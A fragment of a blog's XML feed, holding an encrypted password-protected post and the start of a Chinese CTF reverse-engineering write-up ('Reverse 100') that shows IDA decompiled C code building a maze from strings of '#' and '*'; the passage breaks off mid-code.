b4ede2d2a26a700ddec67f8d0d4b1aa8ce2469f2b54d7d13e5ae09f190937a3bb34921ed59b6fffd7fbd55dfc1f4eb4d4c7736ecdd790a03e9dacccc202b31d60463417a627106d5c42bd2eff0f3e610f550740958cb07c9cd8b9ae66f92771a608cca14406d3c8b8095a0afbf659498b9bd7e4b8fbfd054dd4a4694467b67f218805a0aa9c6daa1e1fb3153262ac12d3c6c2179b89e4d45cbbb1ad473afd2127ed20abc34e0a9708460c3b6a197bf5fdb4f724e40cb8335f7d8119ff7dee1908497d4f848f3c88546ef935dac4829e1aa8e772928a24f130cf38e8fb4c07ac7a3ddbb5882cff0e74398d3910b83e08b7bcbd3636370c2a21ec4b8c39c9663745d1ea668f641bcadcbd47687fada305f24a4cfc6503a9c6702a10dce380de39bd85581f42be9656be2bf2b4df73e6ef0f5ba4288e62ad971108a2870bc5b8c50e6545ef52f0cd044e1e36c291736fb307743b6fdea700753b8d9539e8b761729b165740ebd2b750e650a1f0249de00cd7768ad63e5532dbb17be06a16bec2278f781fc6403b95d199cf931742dce2fd9bf7c0f9c2d6aac2925501398df97e4333bde5b8dfb096e406add7e2a77835dbb21d69d62232ab219993f61cf4a20f8dc994e5bf516b4257ac3aecaeeb9d79001d2ccbcce7276081e58a02315052ee3757a7646b1765c3d0d34bf3c427c923c90a6f20d306a0059d2fcfc807cace6dd09688a9f28c4167486274c9104a132a2c469dff3637586b2ebc8fb653faeef300efa9c40cdbe2c584ef32b7b6cdf6158f42c073b918051238c2a5877162fe95dff73432556e016b59637a900f0b5dbf42d2a1cada7e04777bb20d442e09ecca547014082eeb400a98327c646bf7fe552ed49e42ef15c81e1dcd29254f092f49c4319098405c97a0f15d3a1f31a8384bcae63ca919ecaadbb0789583bce9933e56b63441fd18d622ac062b11f58fe657abd33a00c465540336e1496b39c3ba2f809990ce91ede943fddcb489d15790d6115f141c909da7aab230f21cddcbebf37779948df8a34f1c4880fb79d78d27582d88558b47ce513f9703af763e448c5847b5ba3c06f3f5668798e16695420d37089d72df94ac402b7f5cc7183d3f7983f0cb2e2feaea6d4fdf7ec0f03f551d93d2af0865072a58bcc40f6fdb475e3e2ac2da0343d8b0d35340a717fa8569896c0e4ea15a3d5af064e860096e9851f6dc4b7c7bf681262b61bedef491a15b5c59aea30f47eb68f8b619a3083128ce3cfc26d43bfe7d79b52250bb64a294215034510f45509a8fd8f273d1c0ef754b409f2ea198e9b45c2e2a94e7d84089a4ce778ca40c9aa1e92038ae57505fee93fc9970de6c43a2064064f88f3ddba9f56e3b547bce4f49690aa4fbaec1361ba8ddfe2ef159a9cf2c918ed3c57331fea47355d451d12025dbdbe3793645895bd51b16b127b4af445efb7488561e77cbd224c3ea1660c6482d4c4bd27ef06da5fca1b1e0b54938d04fd297a904d0360b209dab4208984318076d30620103573267533ca97f524d0ddf829150f79da7557535dab30b92e575d02fe768148481d23c282bdcd03bb1377d6982d9fe376f1f2331515b61e277a4ab8f7328fc8107778e487bb319290d916fdc3f30d2b2bd91e44d1067db3b3195e4e3a8179fc7c0252e689f536d63ba6d9b1eb5b9bec9d5cb71da0586d588573e99b2f3afb286f09c3e437de648412e81cf9c23972ddb75912ce76c430f5d22f070d9cd05f946be0c5b1b096553fd284e43db04ed59833c136431d7e2f82bb2390167e2b9acb28cd67e3aeb9f791e697f43f7e740efb59de0367521328d4f1121588866a931b1f371ed480919c9687aeeabd34f8a68d59958a74a9f84508e23d77da240b4ea6543fe82db5259baf4c7af8f94a884cf62bf60c1780cbe9376d357ff376ff3860f6ca1b25b7a7123f338aaf6ad5d20f9763a3c4144747f9d24464fb421f6ba2ecb385d7a4a5e2ce6f3d2292a597c146aafc361bae11aee0e767b7fde55ff7fe7431cd93dd12f9fc90e2c185ec2191293c01d6b0d6d747dd23a87cb73358e1fbe1dc90d98f6f57a7a42b9191ead665bfe43e3ddc3d9e5a01e6e6c0c1719decac8c07c9b5421f2da6b8081ebe326d0da9613a95db861b0fb347e5b42728a1231a7e3f88ac85279806448510e2a2ec6061e0b603c10240b5c4e735d6aa50fac5ad1673024e23244928f3a4fde28889f8c7a52b93c8ae69f7bece49c0690b539b27fd84fd9a91d583ce67660eb08815752e67535c4b2d1625684a15b3f67491480be67ce42f476726948c598a407d2d6ade0a8ab71123f44983ca949cb3e205260d6b336662d662038e9d8200aa6a1569c44bd6a658793b0bc3e3224204a5362129ef56223767d38040b2df00a93b8adbfd50b077ddc8f14326b198850f67a879f2b0886d449885287416e810298fe5d92525308df27a7fa69a94dda1e76b527fc7970f1e840c8d30c96d7c5ee4fbb919a3476bd2f2ba9fa3c418b235cd2a83873fa2bcee77ecc53641d77da2276c99c9a9c3aef487a781b28861501c249b9284b150bf4ca3dfaf9ec3be833bc0acb92074106b2dd4321c26bf9789d0ca7bfe993802c86fa448cb8a25ca2939f4efe0745499269ef02e42cbcbf177f794cffe35fbd0a3f1428cdff23088d98d4df03944dd1232956dc30503e1e69e04661f2cce18524586d18fe05a34aae4ba549fde67a97f5b5f53100107f6ead55a427eacebf85d8f045ec744d8b6f69b153084fd4f531e43a58a3bd78eb8eb0915f9264e35593f0ef43c3d29591506cc3a7713716f929c45635190794c6e1ed8cca86e79c9fb38af4d424056002f435c528d757ba2b914d1cb7d5aa9169e3025822b4056e9e21be64566945f7b591f73a47dd621778638b5049175df86c925dda6b0c893a60211d8680738da772e8d8398b7f6b0b02de8a9fbdfb6e301e3fb2233d55dc441391fade081d6f51d11dc6740de95505cbad734d42373567a16cb3781406b7bd9ea42c7f411b0904d66526a6261eca64b2ea999d97f03f702f6b7c41bb72ccb8603dfb167f9a734d26214fc56d9d17123747497491b54c3835c5e6df8ff08fad7816f3357bd47b6c968d6db094ea96d02e70bd33cfec9d01c25d1bf86aa71f13805bcd930c009e003f60bdb1839e69481d4b028b9d80745c97b42db0b60cf235fd86bea2b2605c3539a5c994d7381524cb084aa6bf126de393dc46263ad9d8fdb64923982505c99e1825c63f21ed0e83cdaf0dca78d51e0036a541cc774882e8cdc88dcc69d1db0b8dc2b0fc571ecaeeb455e5698eea62ba320f79824ccc092d95e21b04373ac5bd282ea5c9a3392bef0be01749f328b2a166d879c2adb0bf8adef3a20004dfc8b736280ed0ba63cb3a5d81264bd734afe264f812134e46bd752012e7005850705fe98b93bce80a06336e772438429ffae23c6621aa5d6fcd41a9ff6d46e67be5948520ee2765b26f7d6edc6dbeb56eef2478c794477ca0440bf29fa9b627e3607a9d309c656fdc612719e1ecf1e83c22c6361273c5b9322863ae0c09dc172b0f070a5bb474f495c9de8ec3ecea688a6012dc2f31ba509bdb8adaadd3a7e1cb89be4987ddcf70c3c0acc41ba5bbba088ff7dbc836fbe83a1881af73ccd7a9a6d36146dd70af7ca844ac48def76eb488ecbd9b334064a3bc03af4d93e7993e89594d2b3f0c28e9ac747c06c848e476731daf3fe54f5c467558946f0fe597754221e1b63fc8bffb89f73984235e53d31b1ce5886bb3ae4e112f28f8f81065cfc7e87313bddd4cf29f49dc8015696a5df1f7b1f4edf8ac4e27063292fc4a3ebc5dd2ab92779d6628b1e947113cb05b52db8e5983bc803ba55a14c7e37a6777a572ae87ee91ee0ac07be9e8dc6305302d6062e2f840b6f033947d2fb2b0684e86a964b358a4a308ec6b8c94ccce371db1df4405947d93c6968075ad5ab631222914bd3fd3673a6c5f94649e6fb368214653dc946f73083206f2d3f7f7ebef7836711effe8178128f590496d984b116d780bfa64c1749f84155618c02a43337f437b021caf0bf94a7ce43a324051b3f353cbbb118181ff321c51cbec33f7acb2b79f320ce01336c0cefee03cd9dd16dccf80169111b1a7ef88027aeb5ce96d33dec6669de47ca66303fa453bffb2980064c22531c02f54e57df3d637a22205f825b928f951c026994c624195c9988a26159b7ece15f9aea570723be60faed7fbda1dc98f7a2572c99502e12258bfde5d59f4b093fda0137c6ff5ee819edc22b0331037ddf3c87751a02869ae9cb7a0a742e322159f87d1536f473867a2f5e81f7c2cf252cf143bb6dee3b0707e8b88223c8b2332a147522fe2c14250fea899472500f50f14479189b94c708080bbbcfb99f9fa5f1b4da5289ed420d56852d2a0c705ce1701a273cb8bc9ee8c066dd97de8d6f7fa5351a411c9428c3fac22f2c3a341f90f635766746bee3eff802c46ab6a03fd86411d9ac3528af0ddc86861c348c211347f56f8d76f3e3d15b713637e68463e4e4f07895d47221cca4852f35579e299a9db0d2cc4a341909900b06dd0c593bf2d8a30a09704c657e34b6a33d63c37045fd78d8284a819cc9ba111178e186f3991535dbc2fb0ea487c4130ae86d29d8e5dce4c449699640c6dfe49d4fac9db3be864eff8b4750557c873698df92f8d61ca4ea5b799e05e3f87b5b338dc5b5f54f39c4e97fa3dc99e34f5547071c53bd2881f406797f3998b39d21d9211b2964f14a1082cf8abd26b7bfe798626d48fe260a6455d545d1e5efdad0f89ad0d507667c43ae669b1d9b0f243a3d3c8e5ac2c85b9bffade602359d82d8483478c14be86442386eb388e2248aaaf6bc808896bd123354463c0bf53d714525a167bd39c2e5411f68f204c14d5e908c554604ba7e45d8148cce27b4d0ada69d97ea2888920dd9829d14946f106a4411cdad18e29ce55459e7f372c93bfdf7b8bcbef227901fc256bc85cb66b38b4e41f88d53b1fdc30704ea72623943356295f39c9675b8908af0150df699b71f094c0bfe641103d8c2a76665ee69b047f6d0dea4f95d9ddb648bb0b8368dedcc1e577f52e02935399</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-pwn-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfwiki-re</title>
      <link href="2021/10/08/ctfwiki-re/"/>
      <url>2021/10/08/ctfwiki-re/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse-100"><a href="#Reverse-100" class="headerlink" title="Reverse 100"></a>Reverse 100</h1><p>64位程序，无壳，拖入ida中反编译<br>查看main函数，可猜出本题为迷宫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400720</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rax</span></span><br><span class="line">  __int64 v25; <span class="comment">// rax</span></span><br><span class="line">  __int64 v26; <span class="comment">// rax</span></span><br><span class="line">  __int64 v27; <span class="comment">// rax</span></span><br><span class="line">  __int64 v28; <span class="comment">// rax</span></span><br><span class="line">  __int64 v29; <span class="comment">// rax</span></span><br><span class="line">  __int64 v30; <span class="comment">// rax</span></span><br><span class="line">  __int64 v31; <span class="comment">// rax</span></span><br><span class="line">  __int64 v32; <span class="comment">// rax</span></span><br><span class="line">  __int64 v33; <span class="comment">// rax</span></span><br><span class="line">  __int64 v34; <span class="comment">// rax</span></span><br><span class="line">  __int64 v35; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v36; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v38; <span class="comment">// er12</span></span><br><span class="line">  _QWORD *v39; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v40; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v41; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v42; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v43; <span class="comment">// rax</span></span><br><span class="line">  __int64 v44; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v45; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// [rsp+2Ch] [rbp-A4h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v49; <span class="comment">// [rsp+2Dh] [rbp-A3h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// [rsp+2Eh] [rbp-A2h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v51; <span class="comment">// [rsp+2Fh] [rbp-A1h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v52; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [rsp+34h] [rbp-9Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v54; <span class="comment">// [rsp+38h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v55; <span class="comment">// [rsp+3Ch] [rbp-94h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v56; <span class="comment">// [rsp+40h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v57; <span class="comment">// [rsp+44h] [rbp-8Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [rsp+48h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v59; <span class="comment">// [rsp+4Ch] [rbp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v60; <span class="comment">// [rsp+50h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v61; <span class="comment">// [rsp+54h] [rbp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v62; <span class="comment">// [rsp+58h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v63; <span class="comment">// [rsp+5Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v64; <span class="comment">// [rsp+60h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v65; <span class="comment">// [rsp+64h] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v66; <span class="comment">// [rsp+68h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v67; <span class="comment">// [rsp+6Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v68; <span class="comment">// [rsp+70h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v69; <span class="comment">// [rsp+74h] [rbp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v70; <span class="comment">// [rsp+78h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v71; <span class="comment">// [rsp+7Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v72; <span class="comment">// [rsp+80h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v73; <span class="comment">// [rsp+84h] [rbp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v74; <span class="comment">// [rsp+88h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v75; <span class="comment">// [rsp+8Ch] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v76; <span class="comment">// [rsp+90h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v77; <span class="comment">// [rsp+94h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v78; <span class="comment">// [rsp+98h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v79; <span class="comment">// [rsp+9Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v80; <span class="comment">// [rsp+A0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v81; <span class="comment">// [rsp+A4h] [rbp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v82; <span class="comment">// [rsp+A8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v83; <span class="comment">// [rsp+ACh] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v84; <span class="comment">// [rsp+B0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v85; <span class="comment">// [rsp+B4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v86; <span class="comment">// [rsp+B8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v87; <span class="comment">// [rsp+BFh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  v87 = <span class="number">1</span>;</span><br><span class="line">  sub_40129E(&amp;v49);</span><br><span class="line">  sub_401338(v47, <span class="number">11L</span>L, &amp;v51, &amp;v50, &amp;v49);</span><br><span class="line">  sub_4012B8(&amp;v49);</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v0 = sub_4013D0(v47, &amp;v52);                  </span><br><span class="line">  sub_440CE0(v0, <span class="string">&quot;**########################################################################################&quot;</span>);</span><br><span class="line">  v53 = <span class="number">10</span>;</span><br><span class="line">  v1 = sub_4013D0(v47, &amp;v53);                  </span><br><span class="line">  sub_440CE0(v1, <span class="string">&quot;#************######*##############**************##*####*#######*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v54 = <span class="number">22</span>;</span><br><span class="line">  v2 = sub_4013D0(v47, &amp;v54);                   </span><br><span class="line">  sub_440CE0(v2, <span class="string">&quot;###*#########*****************************************************************############&quot;</span>);</span><br><span class="line">  v55 = <span class="number">24</span>;</span><br><span class="line">  v3 = sub_4013D0(v47, &amp;v55);                  </span><br><span class="line">  sub_440CE0(v3, <span class="string">&quot;###*#########*###############################################*######*****************#####&quot;</span>);</span><br><span class="line">  v56 = <span class="number">21</span>;</span><br><span class="line">  v4 = sub_4013D0(v47, &amp;v56);                  </span><br><span class="line">  sub_440CE0(v4, <span class="string">&quot;###**********#############################################################################&quot;</span>);</span><br><span class="line">  v57 = <span class="number">1</span>;</span><br><span class="line">  v5 = sub_4013D0(v47, &amp;v57);                </span><br><span class="line">  sub_440CE0(v5, <span class="string">&quot;#*######################*******************************************#####*************#####&quot;</span>);</span><br><span class="line">  v58 = <span class="number">20</span>;</span><br><span class="line">  v6 = sub_4013D0(v47, &amp;v58);                </span><br><span class="line">  sub_440CE0(v6, <span class="string">&quot;############*#####*******************************************************************#####&quot;</span>);</span><br><span class="line">  v59 = <span class="number">15</span>;</span><br><span class="line">  v7 = sub_4013D0(v47, &amp;v59);                  </span><br><span class="line">  sub_440CE0(v7, <span class="string">&quot;###*#################################################*#########*##*######*#####*####*#####&quot;</span>);</span><br><span class="line">  v60 = <span class="number">16</span>;</span><br><span class="line">  v8 = sub_4013D0(v47, &amp;v60);               </span><br><span class="line">  sub_440CE0(v8, <span class="string">&quot;###*####*****#####**********************#############*#########*##********#####*####*#####&quot;</span>);</span><br><span class="line">  v61 = <span class="number">2</span>;</span><br><span class="line">  v9 = sub_4013D0(v47, &amp;v61);            </span><br><span class="line">  sub_440CE0(v9, <span class="string">&quot;#************************####*####################################*#####*###########*#####&quot;</span>);</span><br><span class="line">  v62 = <span class="number">18</span>;</span><br><span class="line">  v10 = sub_4013D0(v47, &amp;v62);         </span><br><span class="line">  sub_440CE0(v10, <span class="string">&quot;###*####*###*#####*############################################*****************####*#####&quot;</span>);</span><br><span class="line">  v63 = <span class="number">17</span>;</span><br><span class="line">  v11 = sub_4013D0(v47, &amp;v63);                 </span><br><span class="line">  sub_440CE0(v11, <span class="string">&quot;###*####*###*#####*####################***************#########*###############*####*#####&quot;</span>);</span><br><span class="line">  v64 = <span class="number">3</span>;</span><br><span class="line">  v12 = sub_4013D0(v47, &amp;v64);                 </span><br><span class="line">  sub_440CE0(v12, <span class="string">&quot;#########*#########*#########*#######***************************##*#####*###########*#####&quot;</span>);</span><br><span class="line">  v65 = <span class="number">26</span>;</span><br><span class="line">  v13 = sub_4013D0(v47, &amp;v65);          </span><br><span class="line">  sub_440CE0(v13, <span class="string">&quot;#############################################################*######*#####################&quot;</span>);</span><br><span class="line">  v66 = <span class="number">4</span>;</span><br><span class="line">  v14 = sub_4013D0(v47, &amp;v66);               </span><br><span class="line">  sub_440CE0(v14, <span class="string">&quot;#******##*#########*#########*#######*#########################*##*#####*###########*#####&quot;</span>);</span><br><span class="line">  v67 = <span class="number">5</span>;</span><br><span class="line">  v15 = sub_4013D0(v47, &amp;v67);                </span><br><span class="line">  sub_440CE0(v15, <span class="string">&quot;#*####*##*#########*#########*#######*#########################*##*#####********####*#####&quot;</span>);</span><br><span class="line">  v68 = <span class="number">19</span>;</span><br><span class="line">  v16 = sub_4013D0(v47, &amp;v68);                  </span><br><span class="line">  sub_440CE0(v16, <span class="string">&quot;###******###*#####*#################################################################*#####&quot;</span>);</span><br><span class="line">  v69 = <span class="number">23</span>;</span><br><span class="line">  v17 = sub_4013D0(v47, &amp;v69);                  </span><br><span class="line">  sub_440CE0(v17, <span class="string">&quot;###*#########*###############################################*############################&quot;</span>);</span><br><span class="line">  v70 = <span class="number">6</span>;</span><br><span class="line">  v18 = sub_4013D0(v47, &amp;v70);                  </span><br><span class="line">  sub_440CE0(v18, <span class="string">&quot;#*####*##*#########*######*******####*###**********####****####*##*############*####*#####&quot;</span>);</span><br><span class="line">  v71 = <span class="number">7</span>;</span><br><span class="line">  v19 = sub_4013D0(v47, &amp;v71);                 </span><br><span class="line">  sub_440CE0(v19, <span class="string">&quot;#*##***#**#########*#################*###*########*####*#######*##*############*####*#####&quot;</span>);</span><br><span class="line">  v72 = <span class="number">25</span>;</span><br><span class="line">  v20 = sub_4013D0(v47, &amp;v72);             </span><br><span class="line">  sub_440CE0(v20, <span class="string">&quot;###**************************************************########*######*#####################&quot;</span>);</span><br><span class="line">  v73 = <span class="number">8</span>;</span><br><span class="line">  v21 = sub_4013D0(v47, &amp;v73);                 </span><br><span class="line">  sub_440CE0(v21, <span class="string">&quot;#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####&quot;</span>);</span><br><span class="line">  v74 = <span class="number">9</span>;</span><br><span class="line">  v22 = sub_4013D0(v47, &amp;v74);             </span><br><span class="line">  sub_440CE0(v22, <span class="string">&quot;#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v75 = <span class="number">11</span>;</span><br><span class="line">  v23 = sub_4013D0(v47, &amp;v75);              </span><br><span class="line">  sub_440CE0(v23, <span class="string">&quot;###################*##############################*####***#####*##*##*###*#####*####*#####&quot;</span>);</span><br><span class="line">  v76 = <span class="number">12</span>;</span><br><span class="line">  v24 = 